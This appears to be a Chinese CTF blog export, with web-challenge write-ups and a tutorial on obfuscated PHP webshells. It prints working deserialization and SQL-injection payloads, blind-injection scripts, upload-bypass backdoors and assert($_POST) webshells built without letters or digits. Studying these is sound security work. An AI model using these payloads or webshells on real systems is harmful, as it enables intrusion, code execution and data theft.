{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"about","text":"","link":"/about/index.html"},{"title":"friends","text":"","link":"/friends/index.html"},{"title":"tags","text":"","link":"/tags/index.html"}],"posts":[{"title":"BUUCTF[NPUCTF2020]web WP","text":"[TOC] BUUCTF[NPUCTF2020]上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up ReadlezPHP这是一道简单的反序列化的题进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签 然后进入页面，看到了源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); 这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行echo $b($a)，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。接下来便是写php脚本构造序列化了，期间试了很多函数比如system等等都被禁用了，但是我们还可以用assert这个函数。首先我们来了解一下断言（assert）这个函数，参考大佬的文章PHP assert 和 eval assert 判断一个表达式是否成立。返回true or false； 我们来看一个例子： 1234&lt;?php$a = &quot;123&quot;;echo assert(is_numeric($a));?&gt; 这段代码输出的结果是： 简言之就是assert()可以将整个字符串参数当作php参数执行，而类似的eval()函数是执行合法的php代码。接下来放出序列化的脚本 12345678910111213&lt;?phpclass HelloPhp{ public $a; public $b; }$c = new HelloPhp;$c-&gt;b = 'assert';$c-&gt;a = 'eval($_POST[a]);';echo urlencode(serialize($c)).&quot;&lt;br/&gt;&quot;;?&gt; 这里除了用assert()之外，还可以用call_user_func()函数 call_user_func — 把第一个参数作为回调函数调用 12345678&lt;?php function barber($type){ echo &quot;you wanted a $type haircut, no problem\\n&quot;;}call_user_func('barber','mushroom');?&gt;//返回内容如下：//you wanted a mushroom haircut, no problem 只要构造出call_user_func(phpinfo)就好了 payload: 1?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D 成功得出结果： flag就在phpinfo中 得到flag！ 未完待续···","link":"/2020/05/28/Kath4rs1s/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/05/28/hello-world/"},{"title":"test","text":"","link":"/2020/05/28/test/"},{"title":"buuoj 刷题记录（一）","text":"[TOC] [网鼎杯 2020 朱雀组]phpweb 抓包 date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数使用 func=readfile&amp;p=index.php 读取源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;, &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;, &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;, &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;, &quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;, &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;, &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;, &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;, &quot;file_put_contents&quot;);function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else { return &quot;&quot;; }}class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}/*$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); }} 禁用了很多函数，看到有 __destruct() 函数，尝试构造反序列化 12345678910111213141516&lt;?phpclass Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();//$a-&gt;p = 'find / -name flag*';$a-&gt;p = 'cat /tmp/flagoefiu4r93';$a-&gt;func = 'system';print_r(urlencode(serialize($a))); 寻找flag文件 读取flag [MRCTF2020]你传你ma呢利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) 1AddType application/x-httpd-php .jpg 然后再写个一句话，连上蚁剑即可 [极客大挑战 2019]Upload绕过后缀名检验：php、php3、php5、php7、pht、phtml文件头加入 GIF89a修改 Content-Type: image/jpeg可解析为php的标签 12345&lt;?php phpinfo(); ?&gt;&lt;?= phpinfo(); ?&gt;&lt;script language=php&gt;phpinfo();&lt;/script&gt; //php7移除&lt;? phpinfo(); ?&gt; //需要php.ini中short_open_tag=On&lt;% phpinfo(); %&gt; //需要php.ini中asp_tags = On php7移除 php版本是5.5.9，用第三个上传之后连接蚁剑即可 [FBCTF2019]RCEService1234567891011121314151617181920212223&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 正则表达式修饰符s匹配多行，这里直接用%0A换行符绕过正则payload： 1{%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A} Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 [SUCTF 2019]CheckIn 考点：文件上传 利用.user.ini构造php后门，.user.ini的使用前提是目录中必须有至少一个php文件，.user.ini有两个配置参数：auto_prepend_file和auto_append_file。auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1auto_prepend_file=01.gif 01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 参考链接https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [GXYCTF2019]BabyUpload没什么好说的，apache服务器上传.htaccess文件 [BJDCTF 2nd]Schrödinger毫无意义的一道题，浪费了十几分钟的时间。 [MRCTF2020]PYWebsite查看源码有flag.php，访问然后修改X-Forwarded-For: 127.0.0.1可得flag [网鼎杯 2018]Comment 二次注入，git泄露 爆破得到账号密码，登陆然后是git泄露，先下载源码然后修复，得到如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用第一次输入category和第二次输入content可以拼接，如下 1234insert into commentset category = '',content=user(),/*', content = '*/#', bo_id = '$bo_id'&quot;; 然后再放两个payload，读取flag: 12',content=(select load_file('/etc/passwd')),/*',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* elementmaster这个没什么好说的，直接上脚本 12345678910111213141516import osimport requests as reqelements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')for symbol in elements: link = &quot;http://bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn/&quot; + symbol + &quot;.php&quot; response = req.get(link) if response.status_code == 200: print(response.text, end='') else: continue","link":"/2020/07/13/buuoj_01/"},{"title":"buuoj 刷题记录（二）","text":"[TOC] [CISCN2019 总决赛 Day2 Web1]Easyweb 考点：盲注，文件上传查看robots.txt： 12User-agent: *Disallow: *.php.bak 抓包过程发现user.php和image.php，于是下载源码，查看image.php 123456789101112131415161718&lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); GET请求id和path参数时首先经过addslashes()函数转义，在单引号，双引号，反斜杠和NULL前面加上反斜杠“\\”,然后再经过str_replace()函数把&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\'&quot;,&quot;'&quot;中的任意一个替换为空，下面的select语句构造sql注入，传入的值为 1id=\\0&amp;path= or 1=1%23 经过addslashes()处理之后select语句就变成了 * from images where id12再经过str_replace()函数处理之后变成了```select * from images where id='\\' or path=' or 1=1%23'&quot;); 构造成功，盲注python脚本： 123456789101112131415161718192021222324import requestsurl = 'http://a9d9fc32-9b43-4a17-8c8b-d137102a6211.node3.buuoj.cn/image.php'flag = ''for i in range(1,100): for j in range(32,128): # payload = '?id=%5C0%27&amp;path=%20or%20if(ascii(mid(database(),{},1))={},1,0)%23'.format(i,j) # 数据库： ciscnfinal # payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=0x636973636e66696e616c),{},1))={},1,0)%23&quot;.format(i,j) # 表名： images,users #payload = &quot;?id=%5C0%27&amp;path=%20or%20if(ascii(mid((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7573657273),{},1))={},1,0)%23&quot;.format(i,j) # users列名： username,password payload = &quot;?id=%5C0&amp;path=%20or%20if(ascii(mid((select%20group_concat(password)%20from%20users),{},1))={},1,0)%23&quot;.format(i,j) # passwor: b5fef2a49e1cee3ee711 r = requests.get(url+payload) #print(url + path) if len(r.text)&gt;10000: flag += chr(j) print(flag) break if(j==127): breakprint(flag) 得到账号和密码登陆，是一个上传界面上传文件之后把上传日志记录到一个php文件，而没有给出文件路径，考虑文件名注入一句话，php被过滤，选择&lt;?= ?&gt;标签，即可，flag在根目录。 [BSidesCF 2019]Futurellaf12一键获取flag。 [WUSTCTF2020]朴实无华 考点：php弱类型，命令注入查看源码 12345678910111213141516171819202122232425262728293031323334353637&lt;?php//level 1if (isset($_GET['num'])){ $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){ echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;; }else{ die(&quot;金钱解决不了穷人的本质问题&quot;); }}else{ die(&quot;去非洲吧&quot;);}//level 2if (isset($_GET['md5'])){ $md5=$_GET['md5']; if ($md5==md5($md5)) echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;; else die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);}else{ die(&quot;去非洲吧&quot;);}//get flagif (isset($_GET['get_flag'])){ $get_flag = $_GET['get_flag']; if(!strstr($get_flag,&quot; &quot;)){ $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag); echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;; system($get_flag); }else{ die(&quot;快到非洲了&quot;); }}else{ die(&quot;去非洲吧&quot;);}?&gt; 一共有三层，第一层利用php弱类型，即可绕过 12intval('2e4')=2intval('2e4'+1)=20001 第二层也是弱类型，找到一个0e开头的字符串，其md5值也是0e开头的字符串即可绕过，写个脚本跑一下就出来了。第三层是执行命令，不能有空格和cat，空格用$IFS$9替换，cat用tac替换，然后读取flag。 [CISCN2019 华东南赛区]Web11 考点：ssti模板注入 打开页面发现页面会记录IP地址，第一时间想到存在XFF头注入，又看到提示Smarty,是模板注入了，抓包然后测试：当输入{1+1}的时候，显示2。看了看别人的writeup，smarty中的{if}标签中可以执行php语句，得flag： 1{if readfile('/flag')}{/if} [BSidesCF 2020]Had a bad day 考点：文件包含 进入页面两个按钮，随便点一个，出来一张图片，发现url变成了这样： 1http://e7a037d7-b95d-419a-ae85-6f3acf5e0ea5.node3.buuoj.cn/index.php?category=woofers 把woofers改为index发现不行，然后改为index woofer出现报错信息：可以发现include语句是这样的，获取url中的category参数然后拼接.php，然后包含这个php文件，尝试用伪协议读取文件： 1?category=php://filter/convert.base64-encode/resource=index base64解码得到index.php源码： 123456789101112&lt;?php$file = $_GET['category'];if(isset($file)){ if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;)){ include ($file . '.php'); } else{ echo &quot;Sorry, we currently only support woofers and meowers.&quot;; }}?&gt; 参数中必须包含index,woofers,meowers中的一个，然后这样刚好读到flag。 1?category=php://filter/convert.base64-encode/resource=index/../flag [CISCN2019 华北赛区 Day1 Web5]CyberPunk这道题真坑啊，进页面是几个输入框，各种提交，查询，修改，删除的功能，然后我在查询那里试了半天，试出一个异或注入，爆出数据库名后，没想到查表得时候发现select什么的都给ban了，也没法绕过，结果没办法，只能找其他方法了。 在主页有一个文件包含，用伪协议读取到所有文件的源码，源码就不一一放出来了，看两个比较重要的 12345678910111213141516171819202122232425262728293031323334353637//confirm.php&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = $_POST[&quot;address&quot;]; $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if($fetch-&gt;num_rows&gt;0) { $msg = $user_name.&quot;已提交订单&quot;; }else{ $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;; $re = $db-&gt;prepare($sql); $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone); $re = $re-&gt;execute(); if(!$re) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单提交成功&quot;; }} else { $msg = &quot;信息不全&quot;;}?&gt; 从上面可以看到，对传入的user_name和phone进行了严格的过滤，但是对```address``却没有做过滤，再看看另一个文件， 1234567891011121314151617181920212223242526272829303132333435//change.php&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){ $msg = ''; $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'; $user_name = $_POST[&quot;user_name&quot;]; $address = addslashes($_POST[&quot;address&quot;]); $phone = $_POST[&quot;phone&quot;]; if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ $msg = 'no sql inject!'; }else{ $sql = &quot;select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'&quot;; $fetch = $db-&gt;query($sql); } if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){ $row = $fetch-&gt;fetch_assoc(); $sql = &quot;update `user` set `address`='&quot;.$address.&quot;', `old_address`='&quot;.$row['address'].&quot;' where `user_id`=&quot;.$row['user_id']; $result = $db-&gt;query($sql); if(!$result) { echo 'error'; print_r($db-&gt;error); exit; } $msg = &quot;订单修改成功&quot;; } else { $msg = &quot;未找到订单!&quot;; }}else { $msg = &quot;信息不全&quot;;}?&gt; 这里对刚刚传入的address参数没有做任何处理就放进了数据表中，那么我们只要在原始传入带有sql注入的address参数，然后在这个页面发起请求，那个sql语句就会被触发，然后就可以成功执行sql注入。思路有了以后，构造payload,这里用的是报错注入： 11' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)# 直接读取显示不全，分两段读取payload： 11' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)# 然后就得到flag了。 [WesternCTF2018]shrine","link":"/2020/07/20/buuoj-02/"},{"title":"无字母数字构造webshell的学习","text":"[toc] 前言最近碰到一道题，便学习了一下相关无字母数字构造webshell的知识。题目如下： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code'])){ $code = $_GET['code']; if(strlen($code)&gt;40){ die(&quot;Long.&quot;); } if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){ die(&quot;NO.&quot;); } @eval($code);}else{ highlight_file(__FILE__);}//$hint = &quot;php function getFlag() to get flag&quot;;?&gt; 题目中可以看到字母和数字是没法使用的，而且payload长度必须在40以内。我们需要绕过正则过滤，利用不可见字符或者正则表达式遗漏的字符通过各种变换来构造出a-z中的任意一个字符，并且长度小于40，然后再利用php允许动态函数执行的特点，拼接出一个函数名，然后动态执行之即可。那么，我们现在的问题就是如何通过各种变换，是的我们能够成功构造出所需的函数，然后拿到webshell。 前置知识php5和7的差异：php5中assert是一个函数，我们可以通过$f=’assert’;$f(…);这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。 php特性(1)代码中没有引号的字符都自动作为字符串 我猜这也是为什么传马的时候$_GET['cmd']和$_GET[cmd]都可以 (2)Ascii码大于 0x7F 的字符都会被当作字符串 (3)php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型 (4)在字符串的变量的后面跟上{}大括号或者中括号[]，里面填写了数字，这里是把字符串变量当成数组处理所以有${_GET}{cmd} 不使用数字字母构造数字利用了php弱类型的特性，true的值为1，所以true+true==2。 12$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1 在php中未定义的变量默认值为null，null==false==0，所以我们能够在不使用任何数字的情况下通过对未定义变量的自增操作来得到一个数字。 123&lt;?php$_++; //$_=1 也可以用!操作符来进行布尔类型的转换。 1234&lt;?phpecho !$_;//这个代码将输出1?&gt; 构造webshell构造无字母数字webshell一般用到下面这几种方法： 异或在php中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，想得到a-z中的某个字母，就找到某两个非字母、数字的字符，他们异或的结果是这个字母即可。 12345&lt;?php echo &quot;A&quot;^&quot;?&quot;;?&gt;运行结果：~ 输出的结果是字符”~”，这是因为代码对字符”A”和字符”?”进行了异或操作。在PHP中两个变量进行异或时，会先将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完又将结果从二进制转换成ASCII值，再转换成字符串。例如下面这个php后门： 123456&lt;?php$_=(':'^'[').('('^'[').('('^'[').('&gt;'^'[').(')'^'[').('/'^'['); // $_='assert';$__='_'.('+'^'{').('/'^'`').('('^'{').('/'^'{'); // $__='_POST';$___=$$__;$_($___[_]); // assert($_POST[_]);?&gt; 执行结果如下： 取反来看一个汉字”和” 123456&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8'))b'\\xe5\\x92\\x8c'&gt;&gt;&gt; print(&quot;和&quot;.encode('utf8')[2])140&gt;&gt;&gt; print(~&quot;和&quot;.encode('utf8')[2])-141 “和”的第三个字节的值为140[0x8c]，取反的值为-141。负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。因此 1234567&lt;?php$_=&quot;和&quot;;print(~($_{2}));print(~&quot;\\x8c&quot;);?&gt;两个写法性质一样结果会输出： ss py脚本： 123456def get(shell): hexbit=''.join(map(lambda x: hex(~(-(256-ord(x)))),shell)) print(hexbit)get('phpinfo')#0x8f0x970x8f0x960x910x990x90 直接贴出p神的webshell吧 1234567891011&lt;?php$__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //$__=2$_=$__/$__; //$_=1$____='';$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__}); //assert$_____='_';$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_}); //_POST$_=$$_____; //$_POST$____($_[$__]); //assert($_POST[2]) 这里也有一种简短的写法${~”\\xa0\\xb8\\xba\\xab”}它等于$_GET。这里相当于直接把utf8编码的某个字节提取出来统一进行取反。 利用字符串自增/自减php的小技巧，先看文档：https://www.php.net/manual/zh/language.operators.increment.php也就是说，’a’++ =&gt; ‘b’，’b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array： 12345&lt;?php$_=[];$_=@&quot;$_&quot;; // $_='Array';echo $_[0].$_[3];// 输出Aa 再加上我们不适用数字构造出的数字，写出下面这个webshell： 12345678910111213141516171819202122232425262728293031323334&lt;?$_=[];$_=@&quot;$_&quot;; // $_='Array';$_=$_[('('=='=')]; // $_=$_[0];$_=A;$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++;$___.=$__; // E$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // R$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // T$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;@$___($_[_]); 执行成功： payload在上面那道题中有一个payload是这样的： 1?code=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo 这里利用了php7中执行动态函数的方法，在php5中是执行不成功的，我们来拆解分析一下payload： 12345678%ff ^ %160 = _%ff ^ %184 = G%ff ^ %186 = E%ff ^ %171 = T%ff%ff%ff%ff^%a0%b8%ba%ab = _GET${%ff%ff%ff%ff^%a0%b8%ba%ab} = $_GET${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff} = $_GET{%ff}phpinfo() 这里放出一个fuzz脚本，帮助快速找到异或的字符： 12345678910111213$payload = '';$argv = str_split('_GET');for ($i=0; $i &lt; count($argv); $i++) { for ($j=0; $j &lt; 255; $j++) { $k = chr($j)^chr(255); //dechex(255)=0xff if($k == $argv[$i]){ echo &quot;%ff ^ %&quot;.$j.&quot; = &quot;.$k.&quot;&lt;br&gt;&quot;; $payload .= '%'.dechex($j); } }}echo $payload; 还有一个payload是这样的，这个是取反： 1(~%8F%97%8F%96%91%99%90)(); 还有这个payload，也是取反: 1?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=phpinfo 这个是~在{}中执行了取反操作，所以${~”\\xa0\\xb8\\xba\\xab”}取反相当于$_GET。","link":"/2020/07/23/webshell/"},{"title":"Flask ssti模板注入一些总结","text":"[TOC] ssti思路服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 ssti模板注入的基本思路就是通过__class__属性找到基类object，通过__subclasses__()查看object中有哪些类可以使用，一般都是去寻找os类，然后通过blobals全局来查找所有的方法及变量及参数，通常用到&lt;class 'os._wrap_close'&gt;类的popen方法。 基本流程首先获取基本类首先通过str、dict、tuple或list等获取python的基本类 dict：保存类实例或对象实例的属性变量键值对字典 class：返回调用的参数类型 mro：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。 bases：返回类型列表 subclasses：返回object的子类 init：类的初始化方法 globals：函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价 也可以用一些其他在jinja2中存在的对象，比如request。在Python中，每个类都有一个bases属性，列出其基类，而mro返回的时解析方法调用的顺序，在其中选择object类就好了。 ''.__class__.__base__ ''.__class__.__mro__[1] 